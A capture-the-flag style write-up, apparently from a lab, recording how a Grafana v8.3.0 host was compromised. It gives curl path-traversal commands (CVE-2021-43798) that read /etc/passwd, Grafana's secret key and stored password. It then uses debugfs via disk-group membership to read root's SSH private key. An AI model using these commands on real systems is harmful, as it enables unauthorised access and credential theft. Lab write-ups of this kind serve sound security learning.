#box

*Created: 1/8/2026*

### Step 1

**Tags:** #Common-Applications #Web-Applications #Grafana #Arbitrary-File-Read #decrypt #Credentials #Path-Traversal

🔗 **URL/Link:** https://www.exploit-db.com/exploits/50581

**Command:**
```bash
curl --path-as-is http://192.168.127.181:3000/public/plugins/tempo/../../../../../../../../../../../../etc/passwd 
&& echo; curl --path-as-is http://192.168.127.181:3000/public/plugins/tempo/../../../../../../../../../../../../etc/grafana/grafana.ini -s | grep ";secret_key" && echo; curl --path-as-is http://192.168.127.181:3000/public/plugins/tempo/../../../../../../../../../../../../var/lib/grafana/grafana.db -s | iconv -f ISO-8859-1 -t UTF-8 | grep -a "basicAuthPassword"
```

*Port: 3000*

> 
> We discover on port 3000 that the current Grafana version v8.3.0 is vulnerable to Directory Traversal on [CVE-2021-43798](https://www.exploit-db.com/exploits/50581)
> 
> We first discover the `/etc/passwd` containing a `sysadmin` user. Further googling permits us to discover the possibility to read two more files: `/etc/grafana/grafana.ini` and `/var/lib/grafana/grafana.db`.
> 
> The first one gives us a secret_key while the second one exposes an encrypted password.
> In that case, it's possible to decrypt the real password by using the encrypted password found in `grafana.db` in clear and the secret_key found in `grafana.ini` with [Grafana AES Decrypt](https://github.com/jas502n/Grafana-CVE-2021-43798).
> 
> `secret_key=SW2YcwTIb9zpOOhoPsMm`
> `password=anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w==`
> Once decrypted, the following password will appear: `SuperSecureP@ssw0rd`
> Given the discovery of `sysadmin` in `/etc/passwd` we try to SSH into the account with the brand new password succeeding.

---

### Step 2

**Tags:** #SSH_Key_Authentication #SSH #debugfs #Linux #disk #Groups

🔗 **URL/Link:** https://reboare.gitbooks.io/booj-security/content/general-linux/privilege-escalation.html#:~:text=to%20the%20host.-,disk,-The%20disk%20group

**Command:**
```bash
debugfs /dev/sda2
cat /root/.ssh/id_rsa
```

> 
> Once authenticated in SSH we discover that our user is part of the `disk` group. This particular group has the possibility to read the any block device present in `/dev`. Meaning that we can possibly read all the content of `/dev/sda*` (usually the primary partition, thus `/`) at `root` level with `debugfs`
> Further information on that LPE can be found [here](https://reboare.gitbooks.io/booj-security/content/general-linux/privilege-escalation.html#:~:text=to%20the%20host.-,disk,-The%20disk%20group)
> 
> Once printed the root private key, we copy it on our machine, `chmod 600` it and finally authenticate with `ssh -i $key root@192.168.127.181` getting a root shell

---

